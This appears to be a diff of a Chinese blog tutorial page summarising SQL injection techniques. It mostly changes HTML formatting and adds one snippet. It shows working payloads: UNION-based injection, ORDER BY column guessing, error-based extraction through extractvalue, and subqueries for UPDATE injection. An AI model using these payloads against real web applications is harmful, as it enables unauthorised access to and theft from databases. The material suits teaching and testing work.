@@ -298,7 +298,7 @@
 	更新于
 	<a href="/2019/04/25/sql注入知识总结/" itemprop="url">
 		<time datetime="2019-04-25T09:05:54.000Z" itemprop="dateUpdated">
-	  		2019-05-08
+	  		2019-05-11
 	  </time>
 	</a> 	
 
@@ -440,15 +440,16 @@ EXTRACTVALUE (XML_document, XPath_string);
 </li>
 </ul>
 <h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>条件：需要有显示位。</p>
-<pre><code>例:$sql=select user,pwd from user where id=&#39;$id&#39;;
+<pre class="line-numbers language-sql"><code class="language-sql">例:$sql<span class="token operator">=</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">,</span>pwd <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'$id'</span><span class="token punctuation">;</span>
 
 注入：
-$id=0&#39; union select (database()),&#39;2
+$id<span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select (database()),'</span><span class="token number">2</span>
 
-首先，用order by 来猜列数
-$id=1&#39; order by 2#
+首先，用<span class="token keyword">order</span> <span class="token keyword">by</span> 来猜列数
+$id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">#</span>
 然后注入。。。
-</code></pre><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>条件：显示报错信息</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>条件：显示报错信息</p>
 <p>常用的报错方法：</p>
 <ul>
 <li>floor</li>
@@ -594,6 +595,13 @@ mysql> select  unhex(conv(125822936825964,10,16));
 1 row in set (0.09 sec)
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在update注入时，取数据时用到的时用的语句：</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token number">0x61646d696e</span><span class="token punctuation">)</span>x
+或
+<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token number">0x61646d696e</span><span class="token punctuation">)</span>x
+username为列名。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>取其他的数据时和别的注入相同。</p>
 <h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><pre class="line-numbers language-mysql"><code class="language-mysql">mysql> select * from user order by 1 and extractvalue(1, concat(0x7e, (select user()),0x7e));
 ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
